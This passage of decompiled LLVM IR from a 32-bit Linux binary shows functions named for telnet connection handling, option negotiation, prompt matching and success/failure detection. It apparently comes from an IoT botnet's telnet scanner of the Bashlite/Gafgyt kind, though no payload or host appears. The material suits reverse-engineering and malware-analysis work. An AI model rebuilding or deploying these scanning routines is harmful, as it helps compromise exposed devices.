  %v1_80491dd = add i32 %tmp2, 16
  %v2_80491dd = inttoptr i32 %v1_80491dd to i32*
  store i32 0, i32* %v2_80491dd, align 4
  %v3_80491ec = add i32 %tmp2, 8
  %v4_80491ec = inttoptr i32 %v3_80491ec to i8*
  store i8 %v6_80491c3, i8* %v4_80491ec, align 1
  %v1_80491f2 = add i32 %tmp2, 24
  %v2_80491f2 = inttoptr i32 %v1_80491f2 to i32*
  %v3_80491f2 = load i32, i32* %v2_80491f2, align 4
  %v3_8049203 = inttoptr i32 %v3_80491f2 to i8*
  %v4_8049203 = call i32 @__GI_memset(i8* %v3_8049203, i32 0, i32 1024)
  ret i32 %v4_8049203

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80491da, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804921b = inttoptr i32 %arg1 to i32*
  %v3_804921b = call i32 @advance_state(i32* %v2_804921b, i32 0)
  %v1_8049226 = add i32 %arg1, 9
  %v2_8049226 = inttoptr i32 %v1_8049226 to i8*
  store i8 1, i8* %v2_8049226, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804923d = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_8059e60.23 to i32*))
  ret i32 %v4_804923d
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8049258 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_8059e40.31 to i32*))
  ret i32 %v4_8049258
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804926e = call i32 @contains_success(i32 %arg1)
  %v1_8049276 = icmp eq i32 %v1_804926e, 0
  %v1_8049278 = icmp eq i1 %v1_8049276, false
  br i1 %v1_8049278, label %dec_label_pc_804929c, label %dec_label_pc_804927a

dec_label_pc_804927a:                             ; preds = %entry
  %v1_8049280 = call i32 @contains_fail(i32 %arg1)
  %v1_8049288 = icmp ne i32 %v1_8049280, 0
  %. = zext i1 %v1_8049288 to i32
  br label %dec_label_pc_804929c

dec_label_pc_804929c:                             ; preds = %dec_label_pc_804927a, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_804927a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80492a1 = load i32, i32* @ebp, align 4
  store i32 %v0_80492a1, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80492bc

dec_label_pc_80492bc:                             ; preds = %dec_label_pc_80492bc, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80492bc, %dec_label_pc_80492bc ]
  %v4_80492bc = add i32 %stack_var_-12.0, 1
  %v2_80492c2 = mul i32 %v4_80492bc, 4
  %v5_80492c5 = add i32 %v2_80492c2, %tmp5
  %v1_80492c8 = inttoptr i32 %v5_80492c5 to i32*
  %v2_80492c8 = load i32, i32* %v1_80492c8, align 4
  %v1_80492ca = icmp eq i32 %v2_80492c8, 0
  %v1_80492cc = icmp eq i1 %v1_80492ca, false
  br i1 %v1_80492cc, label %dec_label_pc_80492bc, label %dec_label_pc_8049301.preheader

dec_label_pc_8049301.preheader:                   ; preds = %dec_label_pc_80492bc
  %v2_80492e9 = inttoptr i32 %arg1 to i8*
  %v5_804930716 = icmp sgt i32 %v4_80492bc, 0
  br i1 %v5_804930716, label %dec_label_pc_80492d7.lr.ph, label %dec_label_pc_8049310

dec_label_pc_80492d7.lr.ph:                       ; preds = %dec_label_pc_8049301.preheader
  br label %dec_label_pc_80492d7

dec_label_pc_80492d7:                             ; preds = %dec_label_pc_80492d7.lr.ph, %dec_label_pc_80492fe
  %storemerge117 = phi i32 [ 0, %dec_label_pc_80492d7.lr.ph ], [ %v4_80492fe, %dec_label_pc_80492fe ]
  %v2_80492da = mul i32 %storemerge117, 4
  %v5_80492dd = add i32 %v2_80492da, %tmp5
  %v1_80492e0 = inttoptr i32 %v5_80492dd to i32*
  %v2_80492e0 = load i32, i32* %v1_80492e0, align 4
  store i32 %v2_80492e0, i32* @eax, align 4
  %v3_80492e9 = call i32 @strcasestr(i8* %v2_80492e9, i32 %v2_80492e0)
  %v1_80492f1 = icmp eq i32 %v3_80492e9, 0
  br i1 %v1_80492f1, label %dec_label_pc_80492fe, label %dec_label_pc_8049310

dec_label_pc_80492fe:                             ; preds = %dec_label_pc_80492d7
  %v4_80492fe = add nuw nsw i32 %storemerge117, 1
  %v5_8049307 = icmp slt i32 %v4_80492fe, %v4_80492bc
  br i1 %v5_8049307, label %dec_label_pc_80492d7, label %dec_label_pc_8049310

dec_label_pc_8049310:                             ; preds = %dec_label_pc_80492d7, %dec_label_pc_80492fe, %dec_label_pc_8049301.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049301.preheader ], [ 0, %dec_label_pc_80492fe ], [ 1, %dec_label_pc_80492d7 ]
  %v2_8049313 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049313, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge117, { 1, 0 }
  uselistorder i32 %v4_80492bc, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049310, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80492d7, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_8049318 = load i32, i32* @edi, align 4
  %v3_8049329 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049334 = or i32 %v3_8049329, 2048
  %v3_8049346 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049334)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8049357 = urem i32 %arg3, 65536
  %v1_8049360 = call i32 @htons(i32 %v1_8049357)
  store i32 %arg2, i32* @edx, align 4
  %v3_804937a = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049382 = icmp eq i32 %v3_804937a, 0
  br i1 %v1_8049382, label %dec_label_pc_8049395, label %dec_label_pc_8049386

dec_label_pc_8049386:                             ; preds = %entry
  br label %dec_label_pc_80494d2

dec_label_pc_8049395:                             ; preds = %entry
  %v2_8049372 = ptrtoint i32* %stack_var_-40 to i32
  %v3_80493b4 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8049372, i32 16)
  %v5_80493bf = icmp slt i32 %v3_80493b4, 0
  %v1_80493c3 = icmp eq i1 %v5_80493bf, false
  br i1 %v1_80493c3, label %dec_label_pc_8049499, label %dec_label_pc_80493c9

dec_label_pc_80493c9:                             ; preds = %dec_label_pc_8049395
  %v1_80493c9 = call i32 @__errno_location(i32 %v3_80493b4)
  %v1_80493ce = inttoptr i32 %v1_80493c9 to i32*
  %v2_80493ce = load i32, i32* %v1_80493ce, align 4
  %v9_80493d0 = icmp eq i32 %v2_80493ce, 115
  %v1_80493d3 = icmp eq i1 %v9_80493d0, false
  br i1 %v1_80493d3, label %dec_label_pc_804948d, label %dec_label_pc_80493d9

dec_label_pc_80493d9:                             ; preds = %dec_label_pc_80493c9
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_80493f6 = ptrtoint i32* %stack_var_-168 to i32
  %tmp32 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_80493f6, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_80493fd = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  %v2_804940a = udiv i32 %arg1, 32
  %v1_8049410 = urem i32 %arg1, 32
  %v0_8049413 = load i32, i32* @ebp, align 4
  %v2_8049413 = mul nuw nsw i32 %v2_804940a, 4
  %v3_8049413 = add nsw i32 %v2_8049413, -164
  %v4_8049413 = add i32 %v3_8049413, %v0_8049413
  %v5_8049413 = inttoptr i32 %v4_8049413 to i32*
  %v6_8049413 = load i32, i32* %v5_8049413, align 4
  %v9_8049413 = shl i32 1, %v1_8049410
  %v12_8049413 = or i32 %v6_8049413, %v9_8049413
  store i32 %v12_8049413, i32* %v5_8049413, align 4
  %v1_804941e = add i32 %arg1, 1
  %v2_8049422 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049435 = call i32 @__libc_select(i32 %v1_804941e, i32 0, i32 %v2_80493f6, i32 0, i32 %v2_8049422)
  %tmp33 = icmp slt i32 %v5_8049435, 1
  br i1 %tmp33, label %dec_label_pc_8049481, label %dec_label_pc_8049441

dec_label_pc_8049441:                             ; preds = %dec_label_pc_80493d9
  store i32 4, i32* %stack_var_-180, align 4
  %v2_804944e = ptrtoint i32* %stack_var_-180 to i32
  %v2_8049455 = ptrtoint i32* %stack_var_-184 to i32
  %v5_8049463 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_8049455, i32 %v2_804944e)
  %v3_804946b = load i32, i32* %stack_var_-184, align 4
  %v1_8049471 = icmp eq i32 %v3_804946b, 0
  br i1 %v1_8049471, label %dec_label_pc_8049499, label %dec_label_pc_8049475

dec_label_pc_8049475:                             ; preds = %dec_label_pc_8049441
  br label %dec_label_pc_80494d2

dec_label_pc_8049481:                             ; preds = %dec_label_pc_80493d9
  br label %dec_label_pc_80494d2

dec_label_pc_804948d:                             ; preds = %dec_label_pc_80493c9
  br label %dec_label_pc_80494d2

dec_label_pc_8049499:                             ; preds = %dec_label_pc_8049441, %dec_label_pc_8049395
  %v3_80494a3 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80494ae = and i32 %v3_80494a3, -2049
  %v3_80494c0 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80494ae)
  br label %dec_label_pc_80494d2

dec_label_pc_80494d2:                             ; preds = %dec_label_pc_804948d, %dec_label_pc_8049481, %dec_label_pc_8049475, %dec_label_pc_8049386, %dec_label_pc_8049499
  %v3_80494d2 = phi i32 [ 0, %dec_label_pc_804948d ], [ 0, %dec_label_pc_8049481 ], [ 0, %dec_label_pc_8049475 ], [ 0, %dec_label_pc_8049386 ], [ 1, %dec_label_pc_8049499 ]
  store i32 %v0_8049318, i32* @edi, align 4
  ret i32 %v3_80494d2

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80494d2, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_80494e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80494e0, i32* %stack_var_-8, align 4
  %v1_80494e4 = call i32 @__libc_fork(i32 %v0_80494e0)
  %v4_80494ec = icmp eq i32 %v1_80494e4, 0
  %v1_80494f0 = icmp eq i1 %v4_80494ec, false
  br i1 %v1_80494f0, label %dec_label_pc_80494fd, label %dec_label_pc_80494f2

dec_label_pc_80494f2:                             ; preds = %entry
  br label %dec_label_pc_80495e1

dec_label_pc_80494fd:                             ; preds = %entry
  %v0_80494fd = load i32, i32* @global_var_805a168.32, align 8
  %v0_8049502 = load i32, i32* @global_var_805a16c.33, align 4
  %v1_8049508 = add i32 %v0_80494fd, 1
  %v5_8049508 = icmp eq i32 %v0_80494fd, -1
  %v2_804950b = zext i1 %v5_8049508 to i32
  %v3_804950b = add i32 %v2_804950b, %v0_8049502
  store i32 %v1_8049508, i32* @global_var_805a168.32, align 8
  store i32 %v3_804950b, i32* @global_var_805a16c.33, align 4
  %v2_8049528 = mul i32 %v1_8049508, 4
  %v1_804952b = add i32 %v2_8049528, 4
  %v1_8049532 = call i32 @malloc(i32 %v1_804952b)
  br label %dec_label_pc_8049568

dec_label_pc_8049546:                             ; preds = %dec_label_pc_8049568, %dec_label_pc_8049599
  %v2_8049549 = mul i32 %storemerge1, 4
  %v5_804954e = add i32 %v2_8049549, %v1_8049532
  %v0_8049559 = load i32, i32* @global_var_80603f4.34, align 4
  %v2_804955e = add i32 %v0_8049559, %v2_8049549
  %v1_8049561 = inttoptr i32 %v2_804955e to i32*
  %v2_8049561 = load i32, i32* %v1_8049561, align 4
  %v2_8049563 = inttoptr i32 %v5_804954e to i32*
  store i32 %v2_8049561, i32* %v2_8049563, align 4
  %v4_8049565 = add i32 %storemerge1, 1
  br label %dec_label_pc_8049568

dec_label_pc_8049568:                             ; preds = %dec_label_pc_80494fd, %dec_label_pc_8049546
  %storemerge1 = phi i32 [ %v4_8049565, %dec_label_pc_8049546 ], [ 0, %dec_label_pc_80494fd ]
  %v0_8049576 = load i32, i32* @global_var_805a168.32, align 8
  %v0_804957b = load i32, i32* @global_var_805a16c.33, align 4
  %v4_8049585 = icmp ne i32 %v0_8049576, 0
  %v2_8049588 = zext i1 %v4_8049585 to i32
  %v3_8049588 = add i32 %v0_804957b, -1
  %v4_8049588 = add i32 %v3_8049588, %v2_8049588
  store i32 %v4_8049588, i32* @ebx, align 4
  %v10_8049594 = icmp eq i32 %v4_8049588, 0
  br i1 %v10_8049594, label %dec_label_pc_8049599, label %dec_label_pc_8049546

dec_label_pc_8049599:                             ; preds = %dec_label_pc_8049568
  %v1_8049585 = add i32 %v0_8049576, -1
  %v10_80495a4 = icmp ult i32 %storemerge1, %v1_8049585
  br i1 %v10_80495a4, label %dec_label_pc_8049546, label %dec_label_pc_80495a9

dec_label_pc_80495a9:                             ; preds = %dec_label_pc_8049599
  %v2_80495b4 = mul i32 %v0_8049576, 4
  %v5_80495b7 = add i32 %v1_8049532, -4
  %v1_80495ba = add i32 %v5_80495b7, %v2_80495b4
  store i32 %v1_80495ba, i32* @edx, align 4
  %v2_80495c0 = inttoptr i32 %v1_80495ba to i32*
  store i32 %v1_80494e4, i32* %v2_80495c0, align 4
  %v0_80495c2 = load i32, i32* @global_var_80603f4.34, align 4
  %v1_80495cb = call i32 @free(i32 %v0_80495c2)
  store i32 %v1_8049532, i32* @global_var_80603f4.34, align 4
  store i32 %v1_80494e4, i32* @ecx, align 4
  br label %dec_label_pc_80495e1

dec_label_pc_80495e1:                             ; preds = %dec_label_pc_80494f2, %dec_label_pc_80495a9
  %v3_80495e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80495e4, i32* @ebx, align 4
  ret i32 %v1_80494e4

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049549, { 1, 0 }
  uselistorder i32 %v1_8049532, { 2, 0, 1 }
  uselistorder i32 %v0_80494fd, { 1, 0 }
  uselistorder label %dec_label_pc_80495e1, { 1, 0 }
  uselistorder label %dec_label_pc_8049568, { 1, 0 }
  uselistorder label %dec_label_pc_8049546, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80495e9 = load i32, i32* @ebp, align 4
  store i32 %v0_80495e9, i32* %stack_var_-4, align 4
  %v1_80495f2 = add i32 %arg2, 1
  %v1_80495f3 = inttoptr i32 %v1_80495f2 to i8*
  %v2_80495f3 = load i8, i8* %v1_80495f3, align 1
  %v5_80495f3 = and i32 %v1_80495f2, -256
  %v9_80495ff = icmp ult i8 %v2_80495f3, -5
  br i1 %v9_80495ff, label %dec_label_pc_80496df, label %dec_label_pc_804960c

dec_label_pc_804960c:                             ; preds = %entry
  %v7_8049613 = icmp eq i8 %v2_80495f3, -1
  br i1 %v7_8049613, label %dec_label_pc_8049615, label %dec_label_pc_804962f

dec_label_pc_8049615:                             ; preds = %dec_label_pc_804960c
  br label %dec_label_pc_80496df

dec_label_pc_804962f:                             ; preds = %dec_label_pc_804960c
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_804963a = ptrtoint i32* %stack_var_-5 to i32
  %v4_8049641 = call i32 @__libc_send(i32 %arg1, i32 %v2_804963a, i32 1, i32 16384)
  %v2_804964d = load i8, i8* %v1_80495f3, align 1
  %v11_804964f = icmp eq i8 %v2_804964d, -4
  %v1_8049651 = icmp eq i1 %v11_804964f, false
  br i1 %v1_8049651, label %dec_label_pc_8049659, label %dec_label_pc_8049653

dec_label_pc_8049653:                             ; preds = %dec_label_pc_804962f
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_8049659:                             ; preds = %dec_label_pc_804962f
  %v2_804965d = load i8, i8* %v1_80495f3, align 1
  %v11_804965f = icmp eq i8 %v2_804965d, -2
  %v1_8049661 = icmp eq i1 %v11_804965f, false
  br i1 %v1_8049661, label %dec_label_pc_8049669, label %dec_label_pc_8049663

dec_label_pc_8049663:                             ; preds = %dec_label_pc_8049659
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_8049669:                             ; preds = %dec_label_pc_8049659
  %v2_804966d = load i8, i8* %v1_80495f3, align 1
  %v10_804966f = icmp eq i8 %v2_804966d, 3
  %v1_8049671 = icmp eq i1 %v10_804966f, false
  %v11_8049695 = icmp eq i8 %v2_804966d, -3
  %v1_8049697 = icmp eq i1 %v11_8049695, false
  br i1 %v1_8049671, label %dec_label_pc_804968f, label %dec_label_pc_8049673

dec_label_pc_8049673:                             ; preds = %dec_label_pc_8049669
  %. = select i1 %v1_8049697, i32 253, i32 251
  %v7_8049687 = or i32 %., %v5_80495f3
  store i32 %v7_8049687, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_804968f:                             ; preds = %dec_label_pc_8049669
  %.2 = select i1 %v1_8049697, i32 254, i32 252
  %v5_80496a3 = load i32, i32* @edx, align 4
  %v6_80496a3 = and i32 %v5_80496a3, -256
  %v7_80496a3 = or i32 %v6_80496a3, %.2
  store i32 %v7_80496a3, i32* %stack_var_-5, align 4
  br label %dec_label_pc_80496a9

dec_label_pc_80496a9:                             ; preds = %dec_label_pc_8049673, %dec_label_pc_8049663, %dec_label_pc_8049653, %dec_label_pc_804968f
  %v4_80496b7 = call i32 @__libc_send(i32 %arg1, i32 %v2_804963a, i32 1, i32 16384)
  %v1_80496c2 = add i32 %arg2, 2
  %v4_80496d0 = call i32 @__libc_send(i32 %arg1, i32 %v1_80496c2, i32 1, i32 16384)
  %v2_80496e2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80496df

dec_label_pc_80496df:                             ; preds = %dec_label_pc_8049615, %dec_label_pc_80496a9, %entry
  %v2_80496e2 = phi i32 [ %v0_80495e9, %dec_label_pc_8049615 ], [ %v2_80496e2.pre, %dec_label_pc_80496a9 ], [ %v0_80495e9, %entry ]
  store i32 %v2_80496e2, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80496df, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80496a9, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80496f2 = ptrtoint i8* %arg1 to i32
  %v3_8049703 = call i32 @_strlen(i8* %arg1)
  %v4_8049703 = mul i32 %v3_8049703, -1
  %v1_8049709 = sub i32 0, %v4_8049703
  %v6_8049730 = sub i32 %v4_80496f2, %v4_8049703
  br label %dec_label_pc_80497b2

dec_label_pc_8049720:                             ; preds = %dec_label_pc_8049770, %dec_label_pc_8049759, %dec_label_pc_8049742, %dec_label_pc_804972b
  %v4_8049720 = add nsw i32 %stack_var_-12.026, 1
  %v7_8049729 = icmp slt i32 %v4_8049720, %v1_8049709
  br i1 %v7_8049729, label %dec_label_pc_804972b, label %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge

dec_label_pc_8049723.dec_label_pc_8049787_crit_edge: ; preds = %dec_label_pc_8049720, %dec_label_pc_8049723.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049723.preheader ], [ %v4_8049720, %dec_label_pc_8049720 ]
  %.pre = sub i32 %v6_8049730, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049787

dec_label_pc_804972b:                             ; preds = %dec_label_pc_8049723.preheader, %dec_label_pc_8049720
  %stack_var_-12.026 = phi i32 [ %v4_8049720, %dec_label_pc_8049720 ], [ %stack_var_-12.1, %dec_label_pc_8049723.preheader ]
  %v2_8049738 = sub i32 %v6_8049730, %stack_var_-12.026
  %v1_804973c = inttoptr i32 %v2_8049738 to i8*
  %v2_804973c = load i8, i8* %v1_804973c, align 1
  %v4_804973e = icmp eq i8 %v2_804973c, 0
  br i1 %v4_804973e, label %dec_label_pc_8049720, label %dec_label_pc_8049742

dec_label_pc_8049742:                             ; preds = %dec_label_pc_804972b
  %v2_8049753 = load i8, i8* %v1_804973c, align 1
  %v7_8049755 = icmp eq i8 %v2_8049753, 32
  br i1 %v7_8049755, label %dec_label_pc_8049720, label %dec_label_pc_8049759

dec_label_pc_8049759:                             ; preds = %dec_label_pc_8049742
  %v2_804976a = load i8, i8* %v1_804973c, align 1
  %v10_804976c = icmp eq i8 %v2_804976a, 13
  br i1 %v10_804976c, label %dec_label_pc_8049720, label %dec_label_pc_8049770

dec_label_pc_8049770:                             ; preds = %dec_label_pc_8049759
  %v2_8049781 = load i8, i8* %v1_804973c, align 1
  %v10_8049783 = icmp eq i8 %v2_8049781, 10
  br i1 %v10_8049783, label %dec_label_pc_8049720, label %dec_label_pc_8049787

dec_label_pc_8049787:                             ; preds = %dec_label_pc_8049770, %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge ], [ %stack_var_-12.026, %dec_label_pc_8049770 ]
  %v1_8049798.pre-phi = phi i8* [ %.pre10, %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge ], [ %v1_804973c, %dec_label_pc_8049770 ]
  %v2_8049798 = load i8, i8* %v1_8049798.pre-phi, align 1
  %v6_804979d = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_8056165.35 to i32)
  %v1_80497a0 = inttoptr i32 %v6_804979d to i8*
  %v2_80497a0 = load i8, i8* %v1_80497a0, align 1
  %v15_80497a2 = icmp eq i8 %v2_8049798, %v2_80497a0
  %v1_80497a4 = icmp eq i1 %v15_80497a2, false
  br i1 %v1_80497a4, label %dec_label_pc_80497af, label %dec_label_pc_80497dc

dec_label_pc_80497af:                             ; preds = %dec_label_pc_8049787
  %v4_80497af = add i32 %storemerge3, 1
  br label %dec_label_pc_80497b2

dec_label_pc_80497b2:                             ; preds = %entry, %dec_label_pc_80497af
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_80497af ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_80497af, %dec_label_pc_80497af ]
  %v3_80497c6 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056165.35, i32 0, i32 0))
  %v7_80497cd = icmp ult i32 %storemerge3, %v3_80497c6
  br i1 %v7_80497cd, label %dec_label_pc_8049723.preheader, label %dec_label_pc_80497dc

dec_label_pc_8049723.preheader:                   ; preds = %dec_label_pc_80497b2
  %v7_804972925 = icmp slt i32 %stack_var_-12.1, %v1_8049709
  br i1 %v7_804972925, label %dec_label_pc_804972b, label %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge

dec_label_pc_80497dc:                             ; preds = %dec_label_pc_80497b2, %dec_label_pc_8049787
  %storemerge = phi i32 [ 1, %dec_label_pc_8049787 ], [ 0, %dec_label_pc_80497b2 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049730, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8056165.35, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80497b2, { 1, 0 }
  uselistorder label %dec_label_pc_8049723.dec_label_pc_8049787_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_804982b = ptrtoint i32* %stack_var_-160 to i32
  %tmp33 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049845 = urem i32 %arg1, 32
  %v9_8049848 = shl i32 1, %v1_8049845
  %v1_8049853 = add i32 %arg1, 1
  %v2_8049857 = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049926 = inttoptr i32 %arg2 to i8*
  %v4_8049932 = icmp eq i32 %arg3, 0
  %v1_804995340 = add i32 %arg8, 2
  %v5_804995943 = icmp slt i32 %v1_804995340, %arg7
  br i1 %v5_804995943, label %dec_label_pc_804995b.lr.ph, label %dec_label_pc_8049989

dec_label_pc_804995b.lr.ph:                       ; preds = %entry
  %v2_804983f = udiv i32 %arg1, 32
  %v2_8049848 = mul nuw nsw i32 %v2_804983f, 4
  %v3_8049848 = add nsw i32 %v2_8049848, -156
  %v5_804987d = ptrtoint i8* %arg6 to i32
  %tmp38 = icmp slt i32 %arg5, 1
  %tmp39 = icmp eq i1 %tmp38, false
  br label %dec_label_pc_804995b

dec_label_pc_8049821:                             ; preds = %dec_label_pc_8049969, %dec_label_pc_804995b
  store i32 %v2_804982b, i32* @edi, align 4
  %v5_8049832 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8049848 = load i32, i32* @ebp, align 4
  %v4_8049848 = add i32 %v3_8049848, %v0_8049848
  %v5_8049848 = inttoptr i32 %v4_8049848 to i32*
  %v6_8049848 = load i32, i32* %v5_8049848, align 4
  %v12_8049848 = or i32 %v6_8049848, %v9_8049848
  store i32 %v12_8049848, i32* %v5_8049848, align 4
  %v5_804986a = call i32 @__libc_select(i32 %v1_8049853, i32 %v2_804982b, i32 0, i32 0, i32 %v2_8049857)
  %tmp35 = icmp slt i32 %v5_804986a, 1
  br i1 %tmp35, label %dec_label_pc_8049989, label %dec_label_pc_804987a

dec_label_pc_804987a:                             ; preds = %dec_label_pc_8049821
  %v6_804987d = add i32 %stack_var_-32.044, %v5_804987d
  %v5_8049880 = inttoptr i32 %v6_804987d to i8*
  %v5_804988d = call i32 @__libc_recv(i32 %arg1, i32 %v6_804987d, i32 1, i32 0)
  %v13_8049898 = icmp eq i32 %v5_804988d, -1
  br i1 %v13_8049898, label %dec_label_pc_80498a4, label %dec_label_pc_804989e

dec_label_pc_804989e:                             ; preds = %dec_label_pc_804987a
  %v4_804989e = icmp eq i32 %v5_804988d, 0
  %v1_80498a2 = icmp eq i1 %v4_804989e, false
  br i1 %v1_80498a2, label %dec_label_pc_80498b3, label %dec_label_pc_80498a4

dec_label_pc_80498a4:                             ; preds = %dec_label_pc_804989e, %dec_label_pc_804987a
  br label %dec_label_pc_8049993

dec_label_pc_80498b3:                             ; preds = %dec_label_pc_804989e
  %v5_80498b6 = add i32 %v5_804988d, %stack_var_-32.044
  %v2_80498bc = load i8, i8* %v5_8049880, align 1
  %v11_80498be = icmp eq i8 %v2_80498bc, -1
  %v1_80498c0 = icmp eq i1 %v11_80498be, false
  br i1 %v1_80498c0, label %dec_label_pc_804991d, label %dec_label_pc_80498c2

dec_label_pc_80498c2:                             ; preds = %dec_label_pc_80498b3
  %v1_80498c5 = add i32 %v6_804987d, 1
  %v5_80498ce = call i32 @__libc_recv(i32 %arg1, i32 %v1_80498c5, i32 2, i32 0)
  %v13_80498d9 = icmp eq i32 %v5_80498ce, -1
  br i1 %v13_80498d9, label %dec_label_pc_80498e5, label %dec_label_pc_80498df

dec_label_pc_80498df:                             ; preds = %dec_label_pc_80498c2
  %v4_80498df = icmp eq i32 %v5_80498ce, 0
  %v1_80498e3 = icmp eq i1 %v4_80498df, false
  br i1 %v1_80498e3, label %dec_label_pc_80498f4, label %dec_label_pc_80498e5

dec_label_pc_80498e5:                             ; preds = %dec_label_pc_80498df, %dec_label_pc_80498c2
  br label %dec_label_pc_8049993

dec_label_pc_80498f4:                             ; preds = %dec_label_pc_80498df
  %v5_80498f7 = add i32 %v5_80498ce, %v5_80498b6
  %v3_8049905 = call i32 @negotiate(i32 %arg1, i32 %v6_804987d, i32 3)
  %v1_804990d = icmp eq i32 %v3_8049905, 0
  %v1_804990f = icmp eq i1 %v1_804990d, false
  br i1 %v1_804990f, label %dec_label_pc_8049950.backedge, label %dec_label_pc_8049911

dec_label_pc_8049950.backedge:                    ; preds = %dec_label_pc_80498f4, %dec_label_pc_8049932, %dec_label_pc_8049938
  %stack_var_-32.0.be = phi i32 [ %v5_80498b6, %dec_label_pc_8049932 ], [ %v5_80498b6, %dec_label_pc_8049938 ], [ %v5_80498f7, %dec_label_pc_80498f4 ]
  %v1_8049953 = add i32 %stack_var_-32.0.be, 2
